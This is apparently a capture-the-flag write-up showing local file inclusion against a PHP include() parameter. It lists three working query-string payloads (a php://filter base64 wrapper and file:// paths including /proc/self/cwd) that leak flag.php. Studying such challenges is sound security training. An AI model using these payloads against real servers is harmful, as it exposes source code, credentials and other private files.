## Basic LFI through PHP filters

* The `include()` function is kinda terrible, and vulnerable to LFI in a variety of ways.
* Our query parameter is passed in, so if we changed the page we want to look at, we can use [php filters](https://www.w3schools.com/php/php_filter.asp) or even just directory traversal to leak the flag

&nbsp;

The following solutions work
* `?include=php://filter/convert.base64-encode/resource=flag.php`
* `?include=file:///var/www/html/php/flag.php`
* `?include=file:///proc/self/cwd/php/flag.php`